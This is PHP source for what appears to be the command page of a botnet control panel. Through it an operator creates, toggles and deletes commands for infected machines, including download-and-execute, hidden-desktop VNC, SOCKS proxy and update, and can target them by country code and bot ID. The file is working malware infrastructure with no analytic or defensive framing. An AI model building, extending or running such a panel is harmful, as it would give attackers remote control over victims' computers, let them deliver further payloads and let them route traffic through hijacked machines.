<?php
require_once('inc/common.php');
$db = db();
ui_start('Commands');
ui_content_start();

if(isset($_GET['delete']))
{
   action_sec_check();
   $query = $db->prepare('DELETE FROM commands WHERE id = ?');
   $query->bindValue(1, $_GET['delete'], PDO::PARAM_INT);
   $query->execute();
   header('location: commands.php');
   exit();      
}

if(isset($_GET['toggle']))
{
   action_sec_check();
   $query = $db->prepare('UPDATE commands SET enabled = NOT enabled WHERE id = ?');
   $query->bindValue(1, $_GET['toggle'], PDO::PARAM_INT);
   $query->execute();
   header('location: commands.php');
   exit();      
}

if(isset($_POST['type']))
{
   action_sec_check();
   $query = $db->prepare('INSERT INTO commands (`type`, param, created, `limit`, countries, uhids, execs, enabled) 
      VALUES (?, ?, ?, ?, ?, ?, 0, 0)');
   $query->bindValue(1, $_POST['type'], PDO::PARAM_INT);
   $query->bindValue(2, $_POST['param'], PDO::PARAM_STR);
   $query->bindValue(3, time(), PDO::PARAM_INT);
   $query->bindValue(4, (int) $_POST['limit'], PDO::PARAM_INT);
   $query->bindValue(5, $_POST['countries'], PDO::PARAM_STR);
   $query->bindValue(6, $_POST['uhids'], PDO::PARAM_STR);
   $query->execute();
   header('location: commands.php');
   exit();
}

function get_command_name($type)
{
   global 
      $CONST_COMMAND_DL_EXEC,
      $CONST_COMMAND_HIDDEN_DESKTOP,
      $CONST_COMMAND_SOCKS,
      $CONST_COMMAND_UPDATE;
   switch($type)
   {
      case $CONST_COMMAND_DL_EXEC:        return 'Download & Execute';
      case $CONST_COMMAND_HIDDEN_DESKTOP: return 'Start VNC';
      case $CONST_COMMAND_SOCKS:          return 'Start Socks';
      case $CONST_COMMAND_UPDATE:         return 'Update';
      default:                            return '?';
   }
}
?>
<div class="box">
  <div>Create</div>
  <form method="POST">
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr>
        <td>Type</td>
        <td>
          <select class="input" name="type" style="width: 160px;">
            <option value="<?php echo($CONST_COMMAND_DL_EXEC); ?>"><?php echo get_command_name($CONST_COMMAND_DL_EXEC); ?></option>
            <option value="<?php echo($CONST_COMMAND_HIDDEN_DESKTOP); ?>"><?php echo get_command_name($CONST_COMMAND_HIDDEN_DESKTOP); ?></option>
            <option value="<?php echo($CONST_COMMAND_SOCKS); ?>"><?php echo get_command_name($CONST_COMMAND_SOCKS); ?></option>
            <option value="<?php echo($CONST_COMMAND_UPDATE); ?>"><?php echo get_command_name($CONST_COMMAND_UPDATE); ?></option>
          </select>
        </td>
      </tr>
      <tr>
        <td>Execution Limit</td>
        <td><input type="number" min="0" value="0" name="limit" style="width: 160px;" class="input"></td>
      </tr>
      <tr>
        <td>Country Codes</td>
        <td><input type="text" class="input" name="countries"></td>
      </tr>
      <tr>
        <td>UHIDs</td>
        <td><input type="text" class="input" name="uhids" style="width: 100%;" value="<?php if(isset($_GET['uhid'])) echo(htmlspecialchars($_GET['uhid'])); ?>"></td>
      </tr>
      <tr><td>Parameter</td><td><input type="text" class="input" name="param" style="width: 100%;"></td></tr>
      <tr>
        <td></td>
        <td>
          <input type="submit" class="btn" value="Submit">
        </td>
      </tr>
    </table>
  </form>
</div>
<?php
$query = $db->query('SELECT * FROM commands');
if($query->rowCount() > 0)
{
?>
<div class="box margin-top">
  <div>Commands</div>
  <table class="table" style="width: 100%;">
    <tr>
      <th>Type</th>
      <th>Created</th>
      <th>Country Codes</th>
      <th>UHIDs</th>
      <th>Executed</th>
      <th>Parameter</th>
    </tr>
<?php
   $rows = $query->fetchAll();
   foreach($rows as $row)
   {
      $emptyHtml = '<label style="color: #AAA;">-</label>';

      if($row['param'] == '')
         $param = $emptyHtml;
      else
      {
         $param = htmlspecialchars(substr($row['param'], 0, 30));
         if(strlen($param) < strlen($row['param']))
            $param = '<label title="'.htmlspecialchars($row['param']).'">'.$param.'...</label>';
      }
      echo('<tr>
              <td>'.get_command_name($row['type']).'</td>
              <td><label title="'.format_time($row['created']).'">'.time_since($row['created']).'</label></td>
              <td>'.($row['countries'] == '' ? $emptyHtml : htmlspecialchars($row['countries'])).'</td>
              <td>'.($row['uhids'] == '' ? $emptyHtml : htmlspecialchars($row['uhids'])).'</td>
              <td>'.$row['execs'].' / '.($row['limit'] == 0 ? '∞' : $row['limit']).'</td>
              <td class="param">'.$param.'</td>
              <td class="action" style="text-align: center;" nowrap>
                <a href="?toggle='.$row['id'].'&amp;time='.$_SESSION['time'].'" style="margin-right: 5px;" onclick="return UserConfirm();" 
                class="btn"> 
                  '.($row['enabled'] ? 'Disable' : 'Enable').'
                </a>

                <a href="?delete='.$row['id'].'&amp;time='.$_SESSION['time'].'" onclick="return UserConfirm();" 
                class="btn">
                  Delete
                </a>
              </td>
            </tr>');
   }
}
?>
  </table>
</div>
<?php
ui_content_end();
ui_end();
?>